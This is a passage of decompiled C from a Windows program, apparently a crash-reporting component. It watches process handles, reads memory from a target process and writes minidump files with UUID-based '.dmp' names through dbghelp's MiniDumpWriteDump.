                      (&local_c,*(HANDLE *)((int)Context + 0x24),FUN_0041002f,Context,0xffffffff,8);
    if (uVar1 != 0) {
      *(void **)((int)Context + 0x34) = local_c;
      EnterCriticalSection((LPCRITICAL_SECTION)this);
      bVar2 = *(char *)((int)this + 0x88) == '\0';
      if (bVar2) {
        FUN_004102d0((void *)((int)this + 0x18),&param_1);
      }
      LeaveCriticalSection((LPCRITICAL_SECTION)this);
      return extraout_EAX & 0xffffff00 | (uint)bVar2;
    }
  }
  return uVar1 & 0xffffff00;
}



void FUN_0040fff2(LPCRITICAL_SECTION param_1)

{
  FUN_0040fe50(param_1);
  return;
}



void FUN_00410001(void **param_1)

{
  void *this;
  
  this = *param_1;
  if (*(char *)((int)this + 0x69) != '\0') {
    FUN_0040f554((int)param_1);
  }
  FUN_004100f4(this,param_1);
  ResetEvent(param_1[10]);
  return;
}



void FUN_0041002f(_LIST_ENTRY *param_1)

{
  FUN_00410041(param_1->Flink,param_1);
  return;
}



void __thiscall FUN_00410041(void *this,_LIST_ENTRY *param_1)

{
  int **this_00;
  _LIST_ENTRY *p_Var1;
  int **ppiVar2;
  int **ppiVar3;
  int **ppiVar4;
  int local_10;
  LPCRITICAL_SECTION local_c;
  int **local_8;
  
  p_Var1 = param_1;
  local_c = (LPCRITICAL_SECTION)this;
  FUN_0040f440((int)param_1);
  if (*(code **)((int)this + 0x58) != (code *)0x0) {
    (**(code **)((int)this + 0x58))(*(undefined4 *)((int)this + 0x5c),p_Var1);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)this);
  if (*(char *)((int)this + 0x88) == '\0') {
    this_00 = (int **)((int)this + 0x18);
    ppiVar3 = (int **)*this_00;
    ppiVar2 = (int **)*ppiVar3;
    ppiVar4 = ppiVar3;
    local_8 = this_00;
    if (ppiVar2 != ppiVar3) {
      do {
        ppiVar4 = ppiVar3;
        if (((_LIST_ENTRY *)ppiVar2[2] == p_Var1) &&
           (ppiVar4 = ppiVar2, (_LIST_ENTRY **)(ppiVar2 + 2) != &param_1)) {
          ppiVar2 = (int **)FUN_00410320(this_00,&local_10,(int *)ppiVar2);
          ppiVar4 = ppiVar3;
        }
        ppiVar2 = (int **)*ppiVar2;
        ppiVar3 = ppiVar4;
        this = local_c;
      } while (ppiVar2 != (int **)*this_00);
    }
    if (ppiVar4 != (int **)*local_8) {
      FUN_00410320(local_8,&local_10,(int *)ppiVar4);
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)this);
    if (p_Var1[6].Blink != (_LIST_ENTRY *)0x0) {
      UnregisterWait(p_Var1[6].Blink);
      p_Var1[6].Blink = (_LIST_ENTRY *)0x0;
    }
    FUN_0040ad35(p_Var1);
  }
  else {
    LeaveCriticalSection((LPCRITICAL_SECTION)this);
  }
  return;
}



undefined8 __thiscall FUN_004100f4(void *this,void *param_1)

{
  bool bVar1;
  undefined8 uVar2;
  undefined4 **local_24 [4];
  int local_14;
  undefined4 local_10;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)local_24;
  local_10 = 7;
  bVar1 = true;
  local_14 = 0;
  local_24[0]._0_2_ = 0;
  if (*(char *)((int)this + 0x68) != '\0') {
    uVar2 = FUN_00410191(this,param_1,local_24);
    bVar1 = (char)uVar2 != '\0';
  }
  if ((*(code **)((int)this + 0x50) != (code *)0x0) && (bVar1)) {
    (**(code **)((int)this + 0x50))
              (*(undefined4 *)((int)this + 0x54),param_1,-(uint)(local_14 != 0) & (uint)local_24);
  }
  SetEvent(*(HANDLE *)((int)param_1 + 0x2c));
  FUN_0040ae40(local_24,'\x01',(void *)0x0);
  uVar2 = FUN_0041a954();
  return uVar2;
}



undefined8 __thiscall FUN_00410191(void *this,void *param_1,undefined4 ***param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  bool bVar3;
  DWORD DVar4;
  uint extraout_EDX;
  undefined8 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 local_a4;
  undefined4 local_a0;
  HMODULE local_9c [37];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_a4 = 0;
  bVar3 = FUN_0040f488(param_1,&local_a4);
  if (bVar3 != false) {
    local_a0 = 0;
    bVar3 = FUN_0040f4bc(param_1,&local_a0);
    if (bVar3 != false) {
      uVar1 = *(undefined4 *)((int)param_1 + 4);
      uVar2 = *(undefined4 *)((int)param_1 + 0x24);
      uVar8 = *(undefined4 *)((int)param_1 + 8);
      uVar7 = *(undefined4 *)((int)param_1 + 0x10);
      uVar6 = local_a4;
      DVar4 = GetCurrentThreadId();
      FUN_00410647(local_9c,extraout_EDX,(void **)((int)this + 0x6c),uVar2,uVar1,local_a0,DVar4,
                   uVar6,uVar7,uVar8);
      uVar5 = FUN_00410b0d(local_9c,param_2);
      if ((char)uVar5 != '\0') {
        FUN_00410729(local_9c);
      }
      FUN_004106c2(local_9c);
    }
  }
  uVar5 = FUN_0041a954();
  return uVar5;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall std::basic_string<unsigned short,struct std::char_traits<unsigned
// short>,class std::allocator<unsigned short>>::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>(class
// std::basic_string<unsigned short,struct std::char_traits<unsigned short>,class
// std::allocator<unsigned short>> const &)
//  public: __thiscall std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>(class std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>> const &)
// 
// Library: Visual Studio 2015 Release

void ** __fastcall basic_string__(void **param_1,uint param_2,void **param_3)

{
  param_1[4] = (void *)0x0;
  param_1[5] = (void *)0x7;
  *(undefined2 *)param_1 = 0;
  FUN_0040ad85(param_1,param_2,param_3,(void *)0x0,(void *)0xffffffff);
  return param_1;
}



void __fastcall FUN_0041029f(int **param_1)

{
  int **ppiVar1;
  int *piVar2;
  int *_Memory;
  
  ppiVar1 = (int **)*param_1;
  _Memory = *ppiVar1;
  *ppiVar1 = (int *)ppiVar1;
  (*param_1)[1] = (int)*param_1;
  param_1[1] = (int *)0x0;
  if (_Memory != *param_1) {
    do {
      piVar2 = (int *)*_Memory;
      FID_conflict__free(_Memory);
      _Memory = piVar2;
    } while (piVar2 != *param_1);
  }
  FID_conflict__free(*param_1);
  return;
}



void __thiscall FUN_004102d0(void *this,undefined4 *param_1)

{
  int *piVar1;
  code *pcVar2;
  int iVar3;
  
                    // WARNING: Load size is inaccurate
  piVar1 = *this;
  iVar3 = FUN_00410356(piVar1,(int *)piVar1[1]);
  if ((undefined4 *)(iVar3 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar3 + 8) = *param_1;
  }
  if (*(int *)((int)this + 4) != 0x15555554) {
    *(int *)((int)this + 4) = *(int *)((int)this + 4) + 1;
    piVar1[1] = iVar3;
    **(int **)(iVar3 + 4) = iVar3;
    return;
  }
  FUN_00422ea9(0x15555554,(short)iVar3);
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



void __thiscall FUN_00410320(void *this,int *param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2;
  *(int *)param_2[1] = *param_2;
  *(int *)(*param_2 + 4) = param_2[1];
  *(int *)((int)this + 4) = *(int *)((int)this + 4) + -1;
  FID_conflict__free(param_2);
  *param_1 = iVar1;
  return;
}



void FUN_00410356(int *param_1,int *param_2)

{
  code *pcVar1;
  int **ppiVar2;
  undefined8 uVar3;
  undefined4 uVar4;
  
  uVar4 = 0xc;
  uVar3 = FUN_00416f82(0xc);
  ppiVar2 = (int **)uVar3;
  if (ppiVar2 == (int **)0x0) {
    FUN_00422e78(uVar4,(int)((ulonglong)uVar3 >> 0x20));
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (param_1 == (int *)0x0) {
    param_1 = (int *)ppiVar2;
    param_2 = (int *)ppiVar2;
  }
  *ppiVar2 = param_1;
  if (ppiVar2 + 1 != (int **)0x0) {
    ppiVar2[1] = param_2;
  }
  return;
}



void __thiscall FUN_0041038a(void *this,undefined4 *param_1)

{
  if ((uint)param_1[5] < 8) {
    FUN_00409529(this,param_1,param_1[4] + 1);
  }
  else {
    if (this != (void *)0x0) {
      *(undefined4 *)this = *param_1;
    }
    *param_1 = 0;
  }
  *(undefined4 *)((int)this + 0x10) = param_1[4];
  *(undefined4 *)((int)this + 0x14) = param_1[5];
  param_1[4] = 0;
  param_1[5] = 7;
  *(undefined2 *)param_1 = 0;
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall std::basic_string<unsigned short,struct std::char_traits<unsigned
// short>,class std::allocator<unsigned short>>::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>(class
// std::basic_string<unsigned short,struct std::char_traits<unsigned short>,class
// std::allocator<unsigned short>>&&)
//  public: __thiscall std::basic_string<unsigned short,struct std::char_traits<unsigned
// short>,class std::allocator<unsigned short>>::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>(unsigned short const *)
//  public: __thiscall std::basic_string<unsigned short,struct std::char_traits<unsigned
// short>,class std::allocator<unsigned short>>::basic_string<unsigned short,struct
// std::char_traits<unsigned short>,class std::allocator<unsigned short>>(unsigned short const *
// const)
//  public: __thiscall std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>(class std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>&&)
//   6 names - too many to list
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

undefined2 * __thiscall basic_string__(void *this,undefined4 *param_1)

{
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined4 *)((int)this + 0x14) = 7;
  *(undefined2 *)this = 0;
  FUN_0041038a(this,param_1);
  return (undefined2 *)this;
}



undefined8 __fastcall FUN_004103fd(undefined2 *param_1,int param_2)

{
  undefined2 extraout_DX;
  undefined8 uVar1;
  undefined4 local_54 [18];
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  FUN_00427488((uint)param_1,param_2,local_54,0x25,
               L"%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",(char)*(undefined4 *)param_2);
  local_c = 0;
  basic_string__(param_1,extraout_DX,local_54);
  uVar1 = FUN_0041a954();
  return uVar1;
}



// WARNING: Type propagation algorithm not settling

uint __thiscall FUN_00410479(void *this,HANDLE param_1,LPCVOID param_2)

{
  char **ppcVar1;
  int **ppiVar2;
  int **ppiVar3;
  undefined4 *puVar4;
  HINSTANCE__ HVar5;
  HINSTANCE__ hModule;
  int **_Memory;
  char *pcVar6;
  uint uVar7;
  int iVar8;
  undefined4 extraout_EDX;
  undefined4 uVar9;
  uint uVar10;
  HMODULE pHVar11;
  int *piVar12;
  int *piVar13;
  undefined8 uVar14;
  LPCVOID local_c;
  void *pvStack8;
  
  local_c = this;
  pvStack8 = this;
  hModule = (HINSTANCE__)ReadProcessMemory(param_1,param_2,&local_c,8,(SIZE_T *)0x0);
  if ((hModule == (HINSTANCE__)0x0) ||
     (hModule = (HINSTANCE__)ReadProcessMemory(param_1,local_c,&param_2,4,(SIZE_T *)0x0),
     hModule == (HINSTANCE__)0x0)) goto LAB_004105c6;
  if (param_2 == (LPCVOID)0xc0000008) {
    hModule = (HINSTANCE__)LoadLibraryW(L"verifier.dll");
    *(HINSTANCE__ *)this = hModule;
    if (hModule != (HINSTANCE__)0x0) {
      hModule = (HINSTANCE__)GetProcAddress((HMODULE)hModule,"VerifierEnumerateResource");
      *(HINSTANCE__ *)((int)this + 4) = hModule;
      if (hModule != (HINSTANCE__)0x0) {
        uVar14 = (*(code *)hModule)(param_1,0,1,FUN_004105d1,this);
        uVar9 = (undefined4)((ulonglong)uVar14 >> 0x20);
        hModule = SUB84(uVar14,0);
        if (hModule != (HINSTANCE__)0x0) goto LAB_004104c2;
        ppiVar2 = *(int ***)((int)this + 0x10);
        _Memory = (int **)*ppiVar2;
        while (_Memory != ppiVar2) {
          if ((_Memory[2] == *(int **)((int)this + 8)) && (_Memory[3] == *(int **)((int)this + 0xc))
             ) {
            _Memory = (int **)*_Memory;
          }
          else {
            ppiVar3 = (int **)*_Memory;
            *_Memory[1] = (int)ppiVar3;
            (*_Memory)[1] = (int)_Memory[1];
            *(int *)((int)this + 0x14) = *(int *)((int)this + 0x14) + -1;
            FID_conflict__free(_Memory);
            _Memory = ppiVar3;
            uVar9 = extraout_EDX;
          }
        }
        ppcVar1 = (char **)((int)this + 0x18);
        pcVar6 = *ppcVar1;
        uVar7 = *(int *)((int)this + 0x1c) - (int)pcVar6;
        uVar10 = *(int *)((int)this + 0x14) * 0x120 + 0x10;
        if (uVar10 < uVar7) {
LAB_0041057f:
          *(char **)((int)this + 0x1c) = pcVar6 + uVar10;
        }
        else if (uVar7 < uVar10) {
          FUN_00410e08(ppcVar1,(short)uVar9,pcVar6 + (uVar10 - *(int *)((int)this + 0x1c)));
          FUN_00416e80(*(uint **)((int)this + 0x1c),0,
                       (uint)(*ppcVar1 + (uVar10 - *(int *)((int)this + 0x1c))));
          pcVar6 = *ppcVar1;
          goto LAB_0041057f;
        }
        puVar4 = (undefined4 *)*ppcVar1;
        *puVar4 = 0x10;
        piVar13 = puVar4 + 4;
        puVar4[1] = 0x120;
        uVar9 = *(undefined4 *)((int)this + 0x14);
        puVar4[3] = 0;
        puVar4[2] = uVar9;
        HVar5 = (HINSTANCE__)((HINSTANCE__ *)((int)this + 0x10))->unused;
        for (hModule = *(HINSTANCE__ *)HVar5; hModule != HVar5; hModule = *(HINSTANCE__ *)hModule) {
          pHVar11 = (HMODULE)((int)hModule + 8);
          piVar12 = piVar13;
          for (iVar8 = 0x48; iVar8 != 0; iVar8 = iVar8 + -1) {
            *piVar12 = pHVar11->unused;
            pHVar11 = pHVar11 + 1;
            piVar12 = piVar12 + 1;
          }
          piVar13 = piVar13 + 0x48;
        }
        goto LAB_004104c2;
      }
    }
LAB_004105c6:
    uVar7 = (uint)hModule & 0xffffff00;
  }
  else {
LAB_004104c2:
    uVar7 = CONCAT31((int3)((uint)hModule >> 8),1);
  }
  return uVar7;
}



undefined4 FUN_004105d1(undefined4 *param_1,int param_2,undefined4 *param_3)

{
  int *piVar1;
  code *pcVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  undefined4 *puVar6;
  
  if (param_1[4] == 3) {
    *(undefined4 *)(param_2 + 8) = *param_1;
    *(undefined4 *)(param_2 + 0xc) = param_1[1];
  }
  piVar1 = *(int **)(param_2 + 0x10);
  iVar3 = FUN_00410f40(piVar1,(int *)piVar1[1]);
  if ((undefined4 *)(iVar3 + 8) != (undefined4 *)0x0) {
    puVar6 = (undefined4 *)(iVar3 + 8);
    for (iVar5 = 0x48; iVar5 != 0; iVar5 = iVar5 + -1) {
      *puVar6 = *param_1;
      param_1 = param_1 + 1;
      puVar6 = puVar6 + 1;
    }
  }
  if (*(int *)(param_2 + 0x14) == 0xdd67c7) {
    FUN_00422ea9(0xdd67c7,(short)iVar3);
    pcVar2 = (code *)swi(3);
    uVar4 = (*pcVar2)();
    return uVar4;
  }
  *(int *)(param_2 + 0x14) = *(int *)(param_2 + 0x14) + 1;
  piVar1[1] = iVar3;
  **(int **)(iVar3 + 4) = iVar3;
  *param_3 = 0;
  return 0;
}



undefined4 * __fastcall
FUN_00410647(undefined4 *param_1,uint param_2,void **param_3,undefined4 param_4,undefined4 param_5,
            undefined4 param_6,undefined4 param_7,undefined4 param_8,undefined4 param_9,
            undefined4 param_10)

{
  param_1[4] = param_4;
  param_1[5] = param_5;
  param_1[6] = param_6;
  param_1[7] = param_7;
  param_1[8] = param_8;
  param_1[9] = param_9;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[10] = param_10;
  *(undefined *)(param_1 + 0xb) = 1;
  basic_string__((void **)(param_1 + 0xc),param_2,param_3);
  param_1[0x12] = 0xffffffff;
  param_1[0x13] = 0xffffffff;
  *(undefined2 *)(param_1 + 0x14) = 0;
  param_1[0x15] = 0;
  param_1[0x16] = 0;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x17));
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x1d));
  return param_1;
}



void __fastcall FUN_004106c2(HMODULE *param_1)

{
  if ((*(char *)(param_1 + 0x14) != '\0') && (param_1[0x12] != (HMODULE)0xffffffff)) {
    CloseHandle(param_1[0x12]);
  }
  if ((*(char *)((int)param_1 + 0x51) != '\0') && (param_1[0x13] != (HMODULE)0xffffffff)) {
    CloseHandle(param_1[0x13]);
  }
  if (*param_1 != (HMODULE)0x0) {
    FreeLibrary(*param_1);
  }
  if (param_1[2] != (HMODULE)0x0) {
    FreeLibrary(param_1[2]);
  }
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x1d));
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x17));
  FUN_0040ae40(param_1 + 0xc,'\x01',(void *)0x0);
  return;
}



// WARNING: Type propagation algorithm not settling

undefined8 __fastcall FUN_00410729(HMODULE *param_1)

{
  undefined4 *puVar1;
  longlong lVar2;
  undefined4 *_Memory;
  BOOL BVar3;
  HMODULE pHVar4;
  undefined4 uVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  undefined8 uVar9;
  HMODULE local_36c;
  HMODULE local_368;
  uint local_364;
  uint local_360;
  HMODULE local_35c;
  undefined4 local_358;
  undefined4 local_354;
  undefined4 local_350;
  int *local_34c;
  undefined4 local_348;
  void *local_344;
  void *local_340;
  undefined4 local_33c;
  HMODULE local_330;
  HMODULE local_32c;
  int local_328;
  undefined4 *local_324;
  undefined local_31d;
  HINSTANCE__ local_31c [64];
  uint local_21c [130];
  undefined4 local_14;
  HMODULE local_10;
  HMODULE local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  uVar7 = (uint)param_1[10] >> 1 & 0xffffff01;
  local_360 = uVar7;
  if ((param_1[0x12] == (HMODULE)0xffffffff) ||
     ((((char)uVar7 != '\0' && (param_1[0x13] == (HMODULE)0xffffffff)) ||
      (local_330 = FUN_00410bb1(param_1), local_330 == (HMODULE)0x0)))) goto LAB_00410afc;
  if (param_1[8] != (HMODULE)0x0) {
    local_36c = param_1[6];
    local_364 = (uint)*(byte *)(param_1 + 0xb);
    local_368 = param_1[8];
  }
  local_14 = 0;
  local_10 = (HMODULE)0x0;
  local_c = (HMODULE)0x0;
  if (*(char *)(param_1 + 0xb) == '\0') {
    local_10 = param_1[6];
    local_c = param_1[7];
    local_14 = 3;
  }
  if (param_1[0x15] == (HMODULE)0x0) {
    iVar6 = 0;
  }
  else {
    iVar6 = param_1[0x15]->unused;
  }
  lVar2 = (ulonglong)(iVar6 + 3) * 0xc;
  iVar6 = (int)((ulonglong)lVar2 >> 0x20);
  _Memory = (undefined4 *)FUN_00423836(-(uint)(iVar6 != 0) | (uint)lVar2,iVar6);
  _Memory[2] = &local_14;
  *_Memory = 0x47670001;
  _Memory[1] = 0xc;
  local_32c = param_1[9];
  local_31c[0].unused._0_2_ = 0;
  local_328 = 1;
  local_324 = _Memory;
  FUN_00416e80((uint *)((int)local_31c + 2),0,0xfe);
  FUN_00416e80(local_21c,0,0x208);
  pHVar4 = local_32c;
  if (local_32c == (HMODULE)0x0) {
LAB_004108de:
    iVar6 = 0;
    if ((param_1[0x15] != (HMODULE)0x0) && (param_1[0x15]->unused != 0)) {
      uVar8 = 0;
      do {
        puVar1 = (undefined4 *)(iVar6 + param_1[0x15][1].unused);
        iVar6 = iVar6 + 0xc;
        _Memory[local_328 * 3] = *puVar1;
        _Memory[local_328 * 3 + 1] = *(undefined4 *)(param_1[0x15][1].unused + -8 + iVar6);
        uVar8 = uVar8 + 1;
        _Memory[local_328 * 3 + 2] = *(undefined4 *)(param_1[0x15][1].unused + -4 + iVar6);
        local_328 = local_328 + 1;
        uVar7 = local_360;
      } while (uVar8 < (uint)param_1[0x15]->unused);
    }
    local_35c = (HMODULE)0x0;
    local_358 = 0;
    local_354 = 0;
    local_350 = 0;
    local_34c = (int *)0x0;
    local_348 = 0;
    local_34c = (int *)FUN_00410f40((int *)0x0,(int *)0x0);
    local_344 = (void *)0x0;
    local_340 = (void *)0x0;
    local_33c = 0;
    if (((param_1[8] == (HMODULE)0x0) || ((*(byte *)(param_1 + 10) & 4) != 0)) ||
       (uVar5 = FUN_00410479(&local_35c,param_1[4],param_1[8]), (char)uVar5 != '\0')) {
      local_31d = 1;
      if ((char)uVar7 != '\0') {
        (*(code *)local_330)
                  (param_1[4],param_1[5],param_1[0x13],(uint)param_1[10] | 4,
                   -(uint)(param_1[8] != (HMODULE)0x0) & (uint)&local_36c,&local_328,0);
      }
      if (local_344 != local_340) {
        _Memory[local_328 * 3] = 0x12;
        _Memory[local_328 * 3 + 1] = (int)local_340 - (int)local_344;
        _Memory[local_328 * 3 + 2] = local_344;
        local_328 = local_328 + 1;
      }
      (*(code *)local_330)
                (param_1[4],param_1[5],param_1[0x12],(uint)param_1[10] & 0xfffffffd,
                 -(uint)(param_1[8] != (HMODULE)0x0) & (uint)&local_36c,&local_328,param_1[0x16]);
    }
    else {
      if (*(char *)(param_1 + 0x14) != '\0') {
        CloseHandle(param_1[0x12]);
      }
      if ((*(char *)((int)param_1 + 0x51) != '\0') && (param_1[0x13] != (HMODULE)0xffffffff)) {
        CloseHandle(param_1[0x13]);
      }
    }
    if (local_35c != (HMODULE)0x0) {
      FreeLibrary(local_35c);
    }
    if (local_344 != (void *)0x0) {
      FID_conflict__free(local_344);
      local_344 = (void *)0x0;
      local_340 = (void *)0x0;
      local_33c = 0;
    }
    FUN_0041029f(&local_34c);
  }
  else {
    if (*(char *)(param_1 + 0xb) == '\0') {
LAB_004108bc:
      _Memory[3] = 0x47670002;
      _Memory[4] = 0x308;
      _Memory[5] = pHVar4;
      local_328 = local_328 + 1;
      goto LAB_004108de;
    }
    local_32c = (HMODULE)0x0;
    BVar3 = ReadProcessMemory(param_1[4],pHVar4,local_31c,0x308,(SIZE_T *)&local_32c);
    if ((BVar3 != 0) && (local_32c == (HMODULE)0x308)) {
      pHVar4 = local_31c;
      goto LAB_004108bc;
    }
    if (*(char *)(param_1 + 0x14) != '\0') {
      CloseHandle(param_1[0x12]);
    }
    if ((*(char *)((int)param_1 + 0x51) != '\0') && (param_1[0x13] != (HMODULE)0xffffffff)) {
      CloseHandle(param_1[0x13]);
    }
  }
  FID_conflict__free(_Memory);
LAB_00410afc:
  uVar9 = FUN_0041a954();
  return uVar9;
}



undefined8 __thiscall FUN_00410b0d(void *this,undefined4 ***param_1)

{
  undefined4 ****lpFileName;
  HANDLE pvVar1;
  uint extraout_EDX;
  undefined8 uVar2;
  undefined4 ****local_24 [4];
  undefined4 local_14;
  uint local_10;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (*(int *)((int)this + 0x48) == -1) {
    local_10 = 7;
    local_24[0] = (undefined4 ****)((uint)local_24[0] & 0xffff0000);
    local_14 = 0;
    uVar2 = FUN_00410c19(this,local_24);
    if ((char)uVar2 != '\0') {
      lpFileName = local_24[0];
      if (local_10 < 8) {
        lpFileName = local_24;
      }
      pvVar1 = CreateFileW((LPCWSTR)lpFileName,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,1,0x80,
                           (HANDLE)0x0);
      *(HANDLE *)((int)this + 0x48) = pvVar1;
      if (pvVar1 != (HANDLE)0xffffffff) {
        *(undefined *)((int)this + 0x50) = 1;
        if ((undefined4 *****)param_1 != local_24) {
          FUN_0040ad85(param_1,extraout_EDX,local_24,(void *)0x0,(void *)0xffffffff);
        }
      }
    }
    FUN_0040ae40(local_24,'\x01',(void *)0x0);
  }
  uVar2 = FUN_0041a954();
  return uVar2;
}



HMODULE __fastcall FUN_00410bb1(HMODULE *param_1)

{
  HMODULE pHVar1;
  
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x1d));
  if (param_1[1] == (HMODULE)0x0) {
    EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x17));
    if (*param_1 == (HMODULE)0x0) {
      pHVar1 = LoadLibraryW(L"dbghelp.dll");
      *param_1 = pHVar1;
    }
    pHVar1 = *param_1;
    LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x17));
    if (pHVar1 != (HMODULE)0x0) {
      pHVar1 = (HMODULE)GetProcAddress(pHVar1,"MiniDumpWriteDump");
      param_1[1] = pHVar1;
    }
  }
  pHVar1 = param_1[1];
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x1d));
  return pHVar1;
}



undefined8 __thiscall FUN_00410c19(void *this,void *param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  code *pcVar1;
  HMODULE pHVar2;
  FARPROC pFVar3;
  void **ppvVar4;
  uint uVar5;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  uint extraout_EDX;
  undefined8 uVar6;
  void *local_7c [6];
  undefined4 local_64 [6];
  undefined local_4c [24];
  undefined4 local_34 [6];
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 uStack20;
  undefined4 uStack16;
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_1c = 0;
  local_18 = 0;
  uStack20 = 0;
  uStack16 = 0;
  lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x5c);
  EnterCriticalSection(lpCriticalSection);
  if (*(int *)((int)this + 0xc) == 0) {
    EnterCriticalSection(lpCriticalSection);
    if (*(int *)((int)this + 8) == 0) {
      pHVar2 = LoadLibraryW(L"rpcrt4.dll");
      *(HMODULE *)((int)this + 8) = pHVar2;
    }
    pHVar2 = *(HMODULE *)((int)this + 8);
    LeaveCriticalSection(lpCriticalSection);
    if (pHVar2 != (HMODULE)0x0) {
      pFVar3 = GetProcAddress(pHVar2,"UuidCreate");
      *(FARPROC *)((int)this + 0xc) = pFVar3;
    }
  }
  pcVar1 = *(code **)((int)this + 0xc);
  LeaveCriticalSection(lpCriticalSection);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)(&local_1c);
    FUN_004103fd((undefined2 *)local_64,(int)&local_1c);
    ppvVar4 = FUN_00410f77(local_7c,(undefined4 *)((int)this + 0x30));
    ppvVar4 = FUN_00410e9b(ppvVar4,extraout_EDX,local_64,0,0xffffffff);
    basic_string__(local_4c,ppvVar4);
    uVar5 = FUN_0041c12a(extraout_ECX,extraout_DX);
    ppvVar4 = FUN_00410d65(local_4c,(undefined4 *)L".dmp",uVar5);
    basic_string__(local_34,ppvVar4);
    FUN_00410d40(param_1,local_34);
    FUN_0040ae40(local_34,'\x01',(void *)0x0);
    FUN_0040ae40(local_4c,'\x01',(void *)0x0);
    FUN_0040ae40(local_7c,'\x01',(void *)0x0);
    FUN_0040ae40(local_64,'\x01',(void *)0x0);
  }
  uVar6 = FUN_0041a954();
  return uVar6;
}



undefined4 * __thiscall FUN_00410d40(void *this,undefined4 *param_1)

{
  if ((undefined4 *)this != param_1) {
    FUN_0040ae40(this,'\x01',(void *)0x0);
    FUN_0041038a(this,param_1);
  }
  return (undefined4 *)this;
}



void ** __thiscall FUN_00410d65(void *this,undefined4 *param_1,uint param_2)

{
  int iVar1;
  code *pcVar2;
  uint uVar3;
  void *pvVar4;
  void *pvVar5;
  void **ppvVar6;
  uint extraout_EDX;
  
  uVar3 = FID_conflict__Inside(this,param_1);
  if ((char)uVar3 == '\0') {
    iVar1 = *(int *)((int)this + 0x10);
    if (-iVar1 - 1U <= param_2) {
      FUN_00422ea9(iVar1,(short)extraout_EDX);
      pcVar2 = (code *)swi(3);
      ppvVar6 = (void **)(*pcVar2)();
      return ppvVar6;
    }
    if (param_2 != 0) {
      pvVar4 = (void *)(iVar1 + param_2);
      uVar3 = FUN_0040aff3((void **)this,extraout_EDX,pvVar4,'\0');
      if ((char)uVar3 != '\0') {
        pvVar5 = this;
        if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
          pvVar5 = *this;
        }
        copy((void *)((int)pvVar5 + *(int *)((int)this + 0x10) * 2),param_1,param_2);
        *(void **)((int)this + 0x10) = pvVar4;
        pvVar5 = this;
        if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
          pvVar5 = *this;
        }
        *(undefined2 *)((int)pvVar5 + (int)pvVar4 * 2) = 0;
      }
    }
  }
  else {
    pvVar4 = this;
    if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      pvVar4 = *this;
    }
    this = FUN_00410e9b((void **)this,extraout_EDX,(undefined4 *)this,
                        (int)param_1 - (int)pvVar4 >> 1,param_2);
  }
  return (void **)this;
}



void __fastcall FUN_00410e08(char **param_1,undefined2 param_2,char *param_3)

{
  char *pcVar1;
  char *pcVar2;
  code *pcVar3;
  char *_Dst;
  uint uVar4;
  char *pcVar5;
  
  pcVar1 = param_1[1];
  if (param_1[2] + -(int)pcVar1 < param_3) {
    if (*param_1 + (-1 - (int)pcVar1) < param_3) {
      FUN_00422ea9(pcVar1,param_2);
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    uVar4 = (int)param_1[2] - (int)*param_1;
    if (-(uVar4 >> 1) - 1 < uVar4) {
      pcVar5 = (char *)0x0;
    }
    else {
      pcVar5 = (char *)(uVar4 + (uVar4 >> 1));
    }
